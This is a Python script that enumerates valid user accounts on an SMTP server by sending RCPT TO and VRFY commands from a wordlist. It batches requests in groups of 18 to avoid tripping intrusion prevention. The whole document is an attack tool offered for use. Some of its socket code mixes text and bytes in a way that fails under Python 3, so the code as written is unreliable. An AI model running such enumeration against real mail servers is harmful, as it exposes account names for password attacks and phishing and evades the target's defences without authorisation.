#!/usr/bin/python3
#
# Simple script intended to abuse SMTP server's RCPT TO command to leak
# usernames having accounts registered within it.
#
# Mariusz B., 2016
#
# Converted to Python3 by kmahyyg, 20230404. Original version is "VRFY".
# Refactored to "RCPT TO" by kmahyyg, 20230920
#
# Designed to split per 18 names, since my environment per 20 failed attempts 
# will trigger connection reset.
#

import socket
import sys
import os

# Specify below your default, fallback wordlist
DEFAULT_WORDLIST = '/home/USERNAME_HERE/Desktop/footprinting-wordlist.txt'
DEFAULT_TIMEOUT = 20

def interpret_smtp_status_code(resp):
    code = int(resp.split(' ')[0])
    messages = {
        250:'Requested mail action okay, completed', 
        251:'User not local; will forward to <forward-path>', 
        252:'Cannot VRFY user, but will accept message and attempt delivery', 
        502:'Command not implemented or disallowed', 
        503:'Bad sequence of commands',
        530:'Access denied (???a Sendmailism)', 
        550:'Requested action not taken: mailbox unavailable', 
        551:'User not local; please try <forward-path>', 
    }
    
    if code in list(messages.keys()):
        return '({} {})'.format(code, messages[code])
    else:
        return '({} code unknown)'.format(code)

def rcptto(server, username, port, timeout, domain, brute=False):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)

    try:
        conn = s.connect((server, port))
    except socket.error as e:
        print('[!] Connection failed with {}:{} - "{}"'.format(server, port, str(e)))
        return False

    try:
        print('[+] Service banner: "{}"'.format(s.recv(1024).strip()))
        s.send('HELO test@'+ domain+'\r\n'.encode())
        print('[>] Response for HELO from {}:{} - '.format(server, port) + s.recv(1024).decode().strip())
        s.send('MAIL FROM: test@'+domain+'\r\n'.encode())
        print('[>] Response for MAIL HELO from {}:{} - '.format(server, port) + s.recv(1024).decode().strip())

    except socket.error as e:
        print('[!] Failed at initial session setup: "{}"'.format(str(e)))
        return False
    
    if brute:
        print('[?] Engaging brute-force enumeration...')


    if brute:
        for i in range(len(username)):
            user = username[i]
            payload = 'RCPT TO:' + user + '@' + domain + '\r\n'
            try:
                s.send(payload.encode())
                res = s.recv(1024).decode().strip()
                print('({}/{}) Server: {}:{} | RCPT {} | Result: [{}]'.format(
                    i+1, len(username), server, port, user, interpret_smtp_status_code(res)))
            except Exception as e:
                print(e)
    else:
        payload = 'VRFY ' + username + '\r\n'
        s.send(payload.encode())
        res = s.recv(1024).decode().strip()

        print('[>] Response from {}:{} - '.format(server, port) + interpret_smtp_status_code(res))
        if 'User unknown' in res:
            print('[!] User not found.')
        elif (res.startswith('25') and username in res and '<' in res and '>' in res):
            print('[+] User found: "{}"'.format(res.strip()))
        else:
            print('[?] Response: "{}"'.format(res.strip()))

    s.close()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('[?] Usage: smtprcptto.py <smtpserver> <domain-name> [username|wordlist] [timeout]')
        print('\t(to specify a port provide it after a colon \':\' in server parameter)')
        sys.exit(0)

    server = sys.argv[1]
    domain = sys.argv[2]
    port = 25 if ':' not in server else int(server[server.find(':')+1:])
    username = sys.argv[3] if len(sys.argv) >= 4 else DEFAULT_WORDLIST
    timeout = DEFAULT_TIMEOUT if len(sys.argv) < 5 else int(sys.argv[4])

    if domain == "" :
        raise AssertionError("Domain is not provided.")

    if os.path.isfile(username):
        names = [] 
        with open(username, 'r') as f:
            for a in f:
                names.append(a.strip())
        print('[>] Provided wordlist file with {} entries.'.format(len(names)))
        # split per 18 items, since 20 will trigger ips
        split_gate = 18
        splited_names = [names[i:i+split_gate] for i in range(0, len(names), split_gate)]
        for per_names in splited_names:
            rcptto(server, per_names, port, timeout, domain, brute=True)
    else:
        rcptto(server, username, port, timeout, domain)
